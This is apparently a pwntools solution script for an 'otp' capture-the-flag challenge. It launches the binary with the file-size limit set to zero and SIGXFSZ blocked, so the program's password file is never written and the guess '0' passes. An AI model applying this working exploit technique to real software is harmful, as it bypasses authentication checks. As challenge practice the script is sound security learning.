#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import resource
import signal

from ctypes import CDLL
from ctypes.util import find_library

from pwn import *

libc = CDLL(find_library("c"), use_errno=True)


def sigmask(signum):
    return 1 << (signum - 1)


def preexec_fn():
    libc.sigblock(sigmask(signal.SIGXFSZ))
    _, hard = resource.getrlimit(resource.RLIMIT_FSIZE)
    resource.setrlimit(resource.RLIMIT_FSIZE, (0, hard))


p = process(["./otp", "0"], preexec_fn=preexec_fn)
p.recvuntil(b"Congratz!\n")

print("exploit succeeded")
print(p.recvline())
